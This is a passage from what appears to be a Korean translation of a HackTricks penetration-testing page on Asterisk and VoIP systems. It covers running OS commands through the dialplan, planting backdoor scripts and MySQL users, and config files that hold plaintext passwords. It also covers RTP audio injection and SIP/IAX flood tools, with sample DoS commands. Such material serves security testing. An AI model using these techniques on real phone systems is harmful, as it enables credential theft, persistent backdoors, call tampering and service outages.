same => n,System(echo "Called at $(date)" >> /tmp/call_log.txt)
```
**`Shell`**이라는 명령어는 필요에 따라 시스템 명령을 실행하는 데 사용될 수 있는 **`System`** 대신 사용될 수 있습니다.

{% hint style="warning" %}
서버가 **`System`** 명령어에서 특정 문자의 사용을 금지하고 있는 경우 (예: Elastix), 웹 서버가 시스템 내에서 **파일을 어떤 방식으로든 생성하는 것을 허용하는지** 확인하고 (예: Elastix 또는 trixbox), 이를 사용하여 **백도어 스크립트를 생성**한 다음 **`System`**을 사용하여 해당 **스크립트를 실행**할 수 있습니다.
{% endhint %}

#### 흥미로운 로컬 파일 및 권한

* **`sip.conf`** -> SIP 사용자의 비밀번호를 포함합니다.
* **Asterisk 서버가 root로 실행 중인 경우**, root를 침해할 수 있습니다.
* **mysql root 사용자**는 **비밀번호가 없을 수 있습니다**.
* 이를 사용하여 백도어로 새로운 mysql 사용자를 생성할 수 있습니다.
* **`FreePBX`**
* **`amportal.conf`** -> 웹 패널 관리자의 비밀번호를 포함합니다 (FreePBX).
* **`FreePBX.conf`** -> 데이터베이스에 액세스하는 데 사용되는 FreePBXuser 사용자의 비밀번호를 포함합니다.
* 이를 사용하여 백도어로 새로운 mysql 사용자를 생성할 수 있습니다.
* **`Elastix`**
* **`Elastix.conf`** -> mysql root 패스워드, IMAPd 패스워드, 웹 관리자 패스워드 등을 평문으로 포함합니다.
* **여러 폴더**가 침해된 asterisk 사용자에 속할 것입니다 (root로 실행 중이 아닌 경우). 이 사용자는 이전 파일을 읽을 수 있고 구성을 제어할 수 있으므로 Asterisk가 실행될 때 다른 백도어 바이너리를 로드하도록 할 수 있습니다.

### RTP 삽입

**`rtpinsertsound`** (`sudo apt install rtpinsertsound`) 및 **`rtpmixsound`** (`sudo apt install rtpmixsound`)와 같은 도구를 사용하여 대화에 **`.wav`**를 삽입할 수 있습니다.

또는 [http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/](http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/)의 스크립트를 사용하여 대화를 **스캔**하는 (**`rtpscan.pl`**), 대화에 `.wav`를 보내는 (**`rtpsend.pl`**) 및 대화에 **소음을 삽입**하는 (**`rtpflood.pl`**) 방법이 있습니다.

### DoS

VoIP 서버에서 DoS를 시도하는 여러 방법이 있습니다.

* [**sippts**](https://github.com/Pepelux/sippts)의 **`SIPPTS flood`**: SIPPTS flood는 대상에 무제한 메시지를 보냅니다.
* `sippts flood -i 10.10.0.10 -m invite -v`
* [**sippts**](https://github.com/Pepelux/sippts)의 **`SIPPTS ping`**: SIPPTS ping은 서버 응답 시간을 확인하기 위해 SIP 핑을 보냅니다.
* `sippts ping -i 10.10.0.10`
* [**IAXFlooder**](https://www.kali.org/tools/iaxflood/): Asterisk에서 사용되는 IAX 프로토콜에 대한 DoS
* [**inviteflood**](https://github.com/foreni-packages/inviteflood/blob/master/inviteflood/Readme.txt): UDP/IP를 통해 SIP/SDP INVITE 메시지를 폭주시키는 도구
* [**rtpflood**](https://www.kali.org/tools/rtpflood/): 여러 개의 올바르게 형성된 RTP 패킷을 보냅니다. 사용 중인 RTP 포트를 알아야 합니다 (먼저 스니핑).
* [**SIPp**](https://github.com/SIPp/sipp): SIP 트래픽을 분석하고 생성할 수 있습니다. 따라서 DoS에도 사용할 수 있습니다.
* [**SIPsak**](https://github.com/nils-ohlmeier/sipsak): SIP 스위스 아미 나이프. SIP 공격을 수행하는 데도 사용할 수 있습니다.
* Fuzzers: [**protos-sip**](https://www.kali.org/tools/protos-sip/), [**voiper**](https://github.com/gremwell/voiper).

### OS 취약점

Asterisk와 같은 소프트웨어를 설치하는 가장 쉬운 방법은 이미 설치된 **OS 배포판**을 다운로드하는 것입니다. 예: **FreePBX, Elastix, Trixbox**... 그러나 이러한 소프트웨어가 작동하면 시스템 관리자가 다시 **업데이트하지 않을 수 있으며** 시간이 지남에 따라 **취약점**이 발견될 수 있습니다.

## 참고 자료

* [https://github.com/Pepelux/sippts/wiki](https://github.com/Pepelux/sippts/wiki)
* [https://github.com/EnableSecurity/sipvicious](https://github.com/EnableSecurity/sipvicious)
* [http://blog.pepelux.org/](http://blog.pepelux.org/)
* [https://www.rtpbleed.com/](https://www.rtpbleed.com/)
* [https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4](https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4)
* [https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)로부터 AWS 해킹을 처음부터 전문가까지 배우세요</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나** **PDF로 HackTricks를 다운로드**하려면 [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 구입하세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
* **💬 [디스코드 그룹](https://discord.gg/hRep4RUj7f)** 또는 [텔레그램 그룹](https://t.me/peass)에 가입하거나 **트위터** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)을 팔로우하세요.
* **HackTricks 및 HackTricks Cloud** 깃허브 저장소에 PR을 제출하여 **해킹 요령을 공유**하세요.

</details>
